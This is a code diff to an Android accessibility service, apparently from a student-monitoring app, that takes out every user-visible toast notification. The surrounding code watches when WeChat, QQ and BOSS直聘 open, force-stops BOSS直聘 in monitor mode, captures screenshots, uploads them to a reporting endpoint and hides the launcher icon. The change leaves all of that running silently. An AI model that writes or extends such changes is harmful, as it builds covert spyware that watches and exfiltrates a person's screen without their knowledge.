@@ -96,16 +96,11 @@ public class MyAccessibilityService extends AccessibilityService {
                 // 示例：检测特定应用打开
                 if (pkg.equals("com.tencent.mm")) {
                     LogUtils.d(this, "微信被打开了！");
-                    Toast.makeText(this, "微信被打开了！", Toast.LENGTH_SHORT).show();
                 } else if (pkg.equals("com.tencent.mobileqq")) {
                     LogUtils.d(this, "QQ被打开了！");
-                    Toast.makeText(this, "QQ被打开了！", Toast.LENGTH_SHORT).show();
                 } else if (pkg.equals("com.hpbr.bosszhipin")) {
                     LogUtils.d(this, "BOSS直聘被打开了！");
-                    Toast.makeText(this, "BOSS直聘被打开了！", Toast.LENGTH_SHORT).show();
                     if (((StudentApplication) getApplicationContext()).isMonitor()) {
-                        Toast.makeText(this, "监控模式下，正在自动执行强制停止...", Toast.LENGTH_SHORT).show();
-                        // 执行强制停止操作
                         setForceStopTarget(pkg, null);
                         // 打开BOSS直聘的设置页面
                         try {
@@ -113,11 +108,10 @@ public class MyAccessibilityService extends AccessibilityService {
                             intent.setData(Uri.parse("package:" + "com.hpbr.bosszhipin"));
                             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                             getApplicationContext().startActivity(intent);
-                            Toast.makeText(getApplicationContext(), "正在自动执行强制停止...", Toast.LENGTH_SHORT).show();
+                            LogUtils.d(this, "正在自动执行强制停止...");
                         } catch (Exception e) {
                             cancelForceStop();
-                            Toast.makeText(getApplicationContext(), "无法打开应用设置: " + e.getMessage(), Toast.LENGTH_SHORT)
-                                    .show();
+                            LogUtils.e(this, "无法打开应用设置: " + e.getMessage());
                         }
                     }
                 }
@@ -348,15 +342,12 @@ public class MyAccessibilityService extends AccessibilityService {
         
         if (success) {
             LogUtils.d(this, "截图触发成功，等待系统保存...");
-            Toast.makeText(this, "正在截图...", Toast.LENGTH_SHORT).show();
-            
             // 延迟2秒后从相册获取截图并上传（等待系统保存截图）
             handler.postDelayed(() -> {
                 getLatestScreenshotAndUpload();
             }, 2000);
         } else {
             LogUtils.e(this, "截图触发失败");
-            Toast.makeText(this, "截图失败，请检查权限", Toast.LENGTH_SHORT).show();
         }
     }
     
@@ -419,19 +410,16 @@ public class MyAccessibilityService extends AccessibilityService {
                     uploadScreenshot(imageBytes, fileName);
                 } else {
                     LogUtils.e(this, "无法读取截图文件");
-                    Toast.makeText(this, "读取截图失败", Toast.LENGTH_SHORT).show();
                 }
             } else {
                 if (cursor != null) {
                     cursor.close();
                 }
                 LogUtils.e(this, "未找到最新截图");
-                Toast.makeText(this, "未找到截图，请重试", Toast.LENGTH_SHORT).show();
             }
             
         } catch (Exception e) {
             LogUtils.e(this, "获取截图失败: " + e.getMessage());
-            Toast.makeText(this, "获取截图失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
         }
     }
     
@@ -442,22 +430,17 @@ public class MyAccessibilityService extends AccessibilityService {
         // 生成带时间戳的文件名
         String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
         String fileName = "screenshot_" + timestamp + ".jpg";
-        
         LogUtils.d(this, "开始上传截图: " + fileName + ", 大小: " + imageBytes.length + " bytes");
-        Toast.makeText(this, "正在上传截图...", Toast.LENGTH_SHORT).show();
-        
         FileUpload fileUpload = new FileUpload(getApplicationContext());
         fileUpload.uploadImage(ApiConfig.report_screenshot, imageBytes, fileName, new ApiCallback() {
             @Override
             public void onSuccess(String result) {
                 LogUtils.d(MyAccessibilityService.this, "截图上传成功: " + result);
-                Toast.makeText(MyAccessibilityService.this, "截图上传成功", Toast.LENGTH_SHORT).show();
             }
             
             @Override
             public void onFailure(Exception e) {
                 LogUtils.e(MyAccessibilityService.this, "截图上传失败: " + e.getMessage());
-                Toast.makeText(MyAccessibilityService.this, "截图上传失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
             }
         });
     }
@@ -492,17 +475,8 @@ public class MyAccessibilityService extends AccessibilityService {
                     hiddenLauncher,
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP);
-
-            // 在主线程中显示 Toast
-            new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
-                Toast.makeText(this, "应用已隐藏（包括搜索）", Toast.LENGTH_LONG).show();
-            });
-            LogUtils.i(this, "MyAccessibilityService", "桌面图标已隐藏，搜索名称已更改为 'demo'");
+            LogUtils.i(this, "MyAccessibilityService", "桌面图标已隐藏");
         } catch (Exception e) {
-            // 在主线程中显示 Toast
-            new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
-                Toast.makeText(this, "隐藏图标失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
-            });
             LogUtils.i(this, "MyAccessibilityService", "隐藏图标失败: " + e.getMessage());
         }
     }
@@ -538,15 +512,7 @@ public class MyAccessibilityService extends AccessibilityService {
                     PackageManager.DONT_KILL_APP);
 
             LogUtils.i(this, "MyAccessibilityService", "桌面图标已恢复");
-            // 在主线程中显示 Toast
-            new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
-                Toast.makeText(this, "应用图标已恢复", Toast.LENGTH_LONG).show();
-            });
         } catch (Exception e) {
-            // 在主线程中显示 Toast
-            new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
-                Toast.makeText(this, "恢复图标失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
-            });
             LogUtils.i(this, "MyAccessibilityService", "恢复图标失败: " + e.getMessage());
         }
     }
